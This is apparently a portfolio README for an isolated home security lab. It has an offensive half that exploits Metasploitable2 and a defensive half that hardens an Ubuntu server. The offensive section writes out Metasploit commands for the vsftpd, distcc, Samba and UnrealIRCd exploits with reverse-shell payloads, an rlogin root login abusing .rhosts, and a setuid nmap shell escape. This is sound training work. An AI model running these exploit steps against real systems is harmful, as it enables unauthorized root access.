[security-lab-README.md](https://github.com/user-attachments/files/31137477/security-lab-README.md)
# 🔐 Security Lab

A dual-sided cybersecurity lab covering both offensive penetration testing and defensive hardening. Built using an isolated VirtualBox internal network with Kali Linux as the attacker and Metasploitable2 as the deliberately vulnerable target, alongside a hardened Ubuntu Server as the blue team reference environment.

> ⚠️ All offensive exercises were conducted in a fully isolated, private lab environment with no internet connectivity. Metasploitable2 is a purpose-built vulnerable VM designed specifically for safe, legal security practice.

---

## Environment

| VM | Role | IP | Purpose |
|---|---|---|---|
| Kali Linux | Attacker | 192.168.100.10 | Penetration testing tools |
| Metasploitable2 | Target | 192.168.100.20 | Deliberately vulnerable target |
| Ubuntu Server 26.04 | Defender | Home network | Hardening reference environment |

**Network**: Kali and Metasploitable2 run on a VirtualBox **Internal Network** (`seclab`) — completely isolated from the home network and internet. Ubuntu Server runs on a separate bridged adapter.

---

## Part 1: Offensive — Penetration Testing

### Reconnaissance

Started with a full service version scan using Nmap:

```bash
nmap -sV 192.168.100.20
```

**Results — 23 open ports including:**

| Port | Service | Version | Risk |
|---|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 | Critical — known backdoor |
| 23/tcp | Telnet | Linux telnetd | Critical — plaintext auth |
| 445/tcp | Samba | smbd 3.X-4.X | High — known RCE |
| 1524/tcp | Bindshell | Metasploitable root shell | Critical — no auth |
| 3306/tcp | MySQL | 5.0.51a | Medium — default creds |
| 6667/tcp | IRC | UnrealIRCd | Critical — known backdoor |

Key skill demonstrated: **triage from nmap output** — not just running the scan, but identifying which services matter, why they're dangerous, and what category of vulnerability each represents.

---

### Finding #1 — vsftpd 2.3.4 Backdoor (Supply-chain compromise)

**CVE**: vsftpd 2.3.4 backdoor (2011)
**Category**: Malicious supply-chain compromise
**Access gained**: Immediate root shell

In 2011, an attacker inserted a backdoor into the vsftpd 2.3.4 source code. Any connection attempt with a username containing `:)` triggers the backdoor, opening a root shell on port 6200.

**Exploit using Metasploit:**
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.20
set LHOST 192.168.100.10
run
```

Result: `Meterpreter session opened` — root access confirmed via `getuid`.

**Post-exploitation findings:**
- Running `ps aux` revealed the backdoor process (`yCIeoFQaiPV`) as a live entry in the process list — visible to any admin who knew to look for random-named processes
- `netstat -antp` showed the backdoor's active connection back to Kali (port 6200 → port 4444)
- This is how you'd confirm compromise forensically from inside a system

---

### Finding #2 — .rhosts Trust Misconfiguration

**Category**: Misconfiguration (trust file)
**Access gained**: Immediate root, zero authentication

Found `/root/.rhosts` containing `+ +` — the wildcard entry that trusts **any host, any user** for passwordless rlogin/rsh access.

```bash
rlogin -l root 192.168.100.20
```

Result: Instant root shell, no password prompt, no exploit required. This demonstrates that **not all compromises need exploit code** — misconfiguration alone can be just as devastating.

**Key distinction from Finding #1**: vsftpd was a software supply-chain attack (malicious code inserted by an adversary). `.rhosts` was an admin misconfiguration of a legitimate tool. Real assessments find both.

---

### Finding #3 — distcc RCE (CVE-2004-2687)

**Category**: Unauthenticated service exposure
**Access gained**: Low-privilege shell (daemon user)

distcc is a distributed compiler daemon that accepts compile jobs from the network with **no authentication**. This version allowed arbitrary command execution.

**Exploit using Metasploit:**
```
use exploit/unix/misc/distcc_exec
set payload cmd/unix/reverse_perl
set RHOSTS 192.168.100.20
set LHOST 192.168.100.10
run
```

Note: The default `cmd/unix/reverse_bash` payload failed because the target's bash was compiled without `/dev/tcp` support. Switched to `cmd/unix/reverse_perl` — demonstrating real-world payload adaptation when the first attempt doesn't work.

Result: Shell as `daemon` user (uid=1, gid=1) — low privilege, not root.

---

### Finding #4 — Privilege Escalation via Setuid Nmap

**Category**: Misconfiguration (excessive file permissions)
**Access gained**: Escalated from daemon → root

Used Metasploit's `local_exploit_suggester` against the daemon session, which identified:
```
exploit/unix/local/setuid_nmap — The target is vulnerable. /usr/bin/nmap is setuid
```

nmap had the setuid bit set, meaning it runs as root regardless of who executes it. Old nmap versions include an interactive mode (`--interactive`) that allows spawning a shell — inheriting root privileges:

```bash
nmap --interactive
nmap> !sh
whoami  # → root
```

This is a two-stage attack: **initial foothold via distcc (low-priv) → privilege escalation via setuid nmap (root)**. This mirrors real-world breach patterns far more accurately than single-step instant-root exploits.

---

### Finding #5 — Samba "username map script" Command Injection

**CVE**: CVE-2007-2447
**Category**: Command injection via unsanitized input
**Access gained**: Immediate root

Old Samba versions allowed a script to run when a client connected. The username field was passed unsanitized to the script — a classic command injection flaw.

```
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.100.20
set LHOST 192.168.100.10
run
```

Result: Root shell. Confirmed `whoami` returned `root`.

---

### Finding #6 — UnrealIRCd 3.2.8.1 Backdoor (Supply-chain compromise)

**CVE**: CVE-2010-2075
**Category**: Malicious supply-chain compromise (same root cause as vsftpd)
**Access gained**: Immediate root

UnrealIRCd 3.2.8.1 contained a backdoor inserted into the source code in 2010. Triggered by sending a specially crafted IRC message.

```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.20
set LHOST 192.168.100.10
run
```

Result: Meterpreter session, confirmed root via `getuid`.

---

### Offensive Summary

| # | Finding | Category | Access |
|---|---|---|---|
| 1 | vsftpd 2.3.4 backdoor | Supply-chain compromise | Immediate root |
| 2 | `.rhosts` with `+ +` | Trust misconfiguration | Immediate root, zero auth |
| 3 | distcc RCE (CVE-2004-2687) | Unauthenticated service | Low-priv (daemon) |
| 4 | Setuid nmap | File permission misconfiguration | Escalated daemon → root |
| 5 | Samba usermap_script | Command injection | Immediate root |
| 6 | UnrealIRCd 3.2.8.1 backdoor | Supply-chain compromise | Immediate root |

**Key cross-cutting lesson**: This box had 6 independent paths to root — any one of them was sufficient for full compromise. Defense in depth had completely failed. In a real assessment, that finding (multiple independent critical vulnerabilities) is itself a significant finding beyond the individual CVEs.

---

## Part 2: Defensive — System Hardening

Applied to the Ubuntu Server 26.04 VM — hardening it against the same categories of attacks demonstrated offensively.

---

### Hardening 1: Service Attack Surface Reduction

```bash
sudo ss -tlnp
sudo systemctl list-units --type=service --state=running
```

Identified and disabled unnecessary services:
- `ModemManager` — no modem attached to a server VM
- `multipathd` — enterprise SAN multipath, not applicable to a single-disk VM

**Principle**: Every running service is potential attack surface, even if not network-facing. If it's not needed, it shouldn't be running. Metasploitable had 23 open ports; the hardened Ubuntu VM had 4.

---

### Hardening 2: SSH Key Authentication

Generated an ED25519 keypair on the Windows host and deployed the public key to the server:

```bash
ssh-keygen -t ed25519 -C "homelab key"
# Copy public key to ~/.ssh/authorized_keys on server
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

Then disabled password authentication entirely in `/etc/ssh/sshd_config` and `/etc/ssh/sshd_config.d/50-cloud-init.conf` (Ubuntu's cloud-init override file — a common gotcha).

**Confirmed** password auth was blocked:
```bash
ssh -o PubkeyAuthentication=no jono@<ip>
# Result: Permission denied (publickey) — no password prompt
```

This single change eliminates 100% of password brute-force attacks — there is no password to guess.

---

### Hardening 3: SSH Config Hardening

Additional SSH settings applied:

```
PermitRootLogin no       # No direct root login
MaxAuthTries 3           # Disconnect after 3 failed attempts
LoginGraceTime 20        # 20-second window to authenticate
```

Verified with `sudo sshd -T | grep -E "permitrootlogin|maxauthtries|logingracetime"` to confirm the effective running config (not just what's in the file).

---

### Hardening 4: Setuid Binary Audit

```bash
find / -perm -4000 -type f 2>/dev/null
```

Identified every setuid binary on the system. Cross-referenced each against installed packages:

```bash
dpkg -S /path/to/binary
```

All binaries were accounted for by legitimate packages. Critically — **no nmap** (which had setuid on Metasploitable, enabling the privilege escalation demonstrated in Finding #4).

This audit is worth running periodically. A setuid binary that doesn't belong to any package (`dpkg -S` returns "no path found") is a major red flag.

---

### Hardening 5: fail2ban

Installed and configured fail2ban to automatically ban IPs with repeated authentication failures:

```ini
# /etc/fail2ban/jail.local
[DEFAULT]
bantime  = 1h
findtime = 10m
maxretry = 3
banaction = ufw

[sshd]
enabled  = true
filter   = sshd-custom
maxretry = 3
```

**Key lesson from this exercise**: With password auth disabled, SSH logs `Connection reset by authenticating user` instead of `Failed password`. fail2ban's default filter watches for `Failed password` entries — so it needed a custom filter to catch the actual log pattern. This is a real-world configuration subtlety: your hardening can break your detection if you're not careful.

---

### Hardening 6: Kernel Hardening (sysctl)

Applied 16 kernel parameters via `/etc/sysctl.d/99-hardening.conf`:

```ini
net.ipv4.conf.all.rp_filter = 1          # IP spoofing protection
net.ipv4.tcp_syncookies = 1               # SYN flood protection
net.ipv4.icmp_echo_ignore_broadcasts = 1  # Smurf attack protection
net.ipv4.conf.all.send_redirects = 0      # Disable ICMP redirects
kernel.kptr_restrict = 2                  # Hide kernel pointers
kernel.dmesg_restrict = 1                 # Restrict kernel log access
fs.suid_dumpable = 0                      # No core dumps from setuid programs
net.ipv6.conf.all.disable_ipv6 = 1        # Disable unused IPv6
```

Applied immediately without reboot: `sudo sysctl -p /etc/sysctl.d/99-hardening.conf`

These settings are aligned with CIS Benchmark Level 1 for Linux servers.

---

### Hardening 7: File Integrity Monitoring (auditd)

Configured auditd to watch sensitive files and log all access with full forensic detail:

```bash
# /etc/audit/rules.d/hardening.rules
-w /etc/passwd -p rwa -k identity
-w /etc/shadow -p rwa -k identity
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /etc/sudoers -p wa -k sudoers
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -k root_commands
```

**Demonstrated forensic capability:**
```bash
sudo cat /etc/shadow > /dev/null
sudo ausearch -k identity --start recent
```

The audit log recorded: exact timestamp, user (auid=1000 = jono), process (`cat`), file accessed (`/etc/shadow`), and the full command (`proctitle` field in hex). In incident response, this is the difference between "we know exactly what happened and when" vs "we have no idea."

---

### Hardening 8: UFW Advanced Rules

Added rate limiting and logging improvements:

```bash
sudo ufw delete allow ssh
sudo ufw limit ssh          # Block IPs with >6 connections in 30 seconds
sudo ufw logging medium     # Log blocked packets with rate-limit info
```

Also blocked commonly probed ports that should never be in use:

```bash
sudo ufw deny 23/tcp    # Telnet
sudo ufw deny 3389/tcp  # RDP
sudo ufw deny 5900/tcp  # VNC
```

---

### Hardening 9: Password Policy (pwquality)

Installed `libpam-pwquality` and configured `/etc/security/pwquality.conf`:

```ini
minlen = 12      # Minimum 12 characters
ucredit = -1     # At least 1 uppercase
lcredit = -1     # At least 1 lowercase
dcredit = -1     # At least 1 number
ocredit = -1     # At least 1 special character
difok = 8        # 8 characters must differ from old password
```

Applied password expiry policy to existing accounts:

```bash
sudo chage -M 90 -m 1 -W 14 jono
# Max 90 days, min 1 day between changes, warn 14 days before expiry
```

---

### Defensive Summary

| # | Hardening | Protects Against |
|---|---|---|
| 1 | Service reduction | Reduces attack surface — fewer services = fewer vulnerabilities |
| 2 | SSH key auth | Eliminates all brute-force password attacks |
| 3 | SSH config hardening | Prevents direct root login, limits auth attempts |
| 4 | Setuid audit | Catches privilege escalation paths (like the nmap finding) |
| 5 | fail2ban | Automated IP banning on repeated auth failures |
| 6 | Kernel hardening | Network attack protection, memory hardening |
| 7 | auditd | Forensic logging for incident response |
| 8 | UFW rate limiting | Automated blocking of scanning/brute-force at the network level |
| 9 | Password policy | Enforces strong passwords, prevents reuse |

---

## Skills Demonstrated

`Penetration Testing` `Metasploit` `Nmap` `Kali Linux` `Vulnerability Assessment` `Post-Exploitation` `Privilege Escalation` `Linux Hardening` `SSH Hardening` `UFW` `fail2ban` `auditd` `PAM` `sysctl` `CVE Research` `VirtualBox Networking` `Incident Response`
